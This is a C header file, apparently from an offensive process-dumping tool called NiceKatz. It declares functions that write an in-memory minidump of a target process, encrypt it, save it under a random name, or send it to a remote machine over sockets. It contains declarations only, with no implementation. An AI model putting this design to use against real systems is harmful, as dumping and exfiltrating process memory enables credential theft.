#pragma once
#include "NiceKatz.h"
#include <DbgHelp.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Dbghelp")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

typedef struct CallbackHelper
{
	LPVOID dumpBuffer;
	DWORD bytesRead;
} CallbackHelper, * pCallbackHelper;

/*
* Initializes MiniDump callback parameter and calls MiniDumpWriteDump API
* Depending on the supplied command line args of the program, the in memory dump can either get ecnrypted, sent remotly or written to disk.
* @param hTarget - An open handle of the target process to dump
* @param TargetId - The target PID of the process to dump
* @param pCmdArgs - A pointer to CommandLineArgs structure (defined in NiceKatz.h) which represents the supplied command line args
* @return BOOL - TRUE or FALSE
*/
BOOL MiniDump(HANDLE hTarget, int TargetPid, pCommandLineArgs pCmdArgs);

/*
* Generates a random file name and assigns it to the pFileName variable
* @param pFileName - A pointer to a wide character that represents the file name
*/
void GenerateOutFileName(WCHAR* pFileName);

/*
* Sends the in memory dump of the target process to a remote machine via sockets
* @param helper - A pointer to CallbackHelper struct which represents information about the dump buffer in memory
* @param pCmdArgs - A pointer to CommandLineArgs structure (defined in NiceKatz.h) which represents the supplied command line args
* @return BOOL - TRUE or FALSE
*/
BOOL SendSocket(pCallbackHelper helper, pCommandLineArgs pCmdArgs);

/*
* A callback function used with MiniDumpWriteDump API
* Recives extended minidump information
* @param CallbackParam - An application defined parameter
* @param CallbackInput - A pointer to MINIDUMP_CALLBACK_INPUT (defined in DbgHelp.h) that specified extended minidump information
* @param CallbackOutput - A pointer to MINIDUMP_CALLBACK_OUTPUT (defined in DbgHelp.h) that recives application defined information from the callback function
* @return BOOL - TRUE or FALSE
* For more information see MSDN documantation - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nc-minidumpapiset-minidump_callback_routine
*/
BOOL CALLBACK minidumpCallback(
	PVOID callbackParam,
	const PMINIDUMP_CALLBACK_INPUT callbackInput,
	PMINIDUMP_CALLBACK_OUTPUT callbackOutput
);